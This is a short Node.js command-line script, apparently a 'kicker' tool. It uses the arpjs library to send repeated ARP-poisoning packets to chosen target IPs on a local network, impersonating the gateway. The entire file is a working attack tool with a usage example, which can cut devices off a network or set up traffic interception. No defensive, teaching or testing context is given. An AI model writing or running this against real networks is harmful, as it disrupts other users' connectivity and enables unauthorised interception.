// Example: sudo node index.js -i wlp0s20f3 -g 192.168.4.1 -t 192.168.4.28 -p 500

const arp = require('arpjs');
let INTERFACE, GATEWAY_IP, TARGETS = [], INTERVAL;
const args = process.argv.slice(2);
// Get command line args
args.forEach((val, index, args) => {
  switch (val) {
    case '-i': INTERFACE = args[index + 1]; break;
    case '-g': GATEWAY_IP = args[index + 1]; break;
    case '-t': TARGETS = args[index + 1].split(','); break;
    case '-p': INTERVAL = args[index + 1]; break;
  }
});

console.log('Kicking...');
arp.setInterface(INTERFACE);
setInterval(function () {
  TARGETS.forEach((t) => {
    arp.poison(t, GATEWAY_IP)
  });
}, INTERVAL);